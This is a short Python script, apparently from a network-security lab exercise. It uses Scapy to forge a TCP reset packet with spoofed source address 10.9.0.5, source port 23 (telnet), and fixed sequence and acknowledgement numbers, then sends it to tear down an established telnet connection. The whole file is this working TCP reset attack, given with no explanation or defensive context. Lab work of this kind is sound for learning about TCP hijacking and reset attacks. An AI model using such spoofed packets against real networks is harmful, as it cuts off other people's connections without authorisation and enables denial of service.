#!/usr/bin/env python3
from scapy.all import *

ip  = IP(src="10.9.0.5", dst="10.9.0.6")
tcp = TCP(sport=23, dport=59214, flags="R", seq=4196641791, ack=2333627094)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)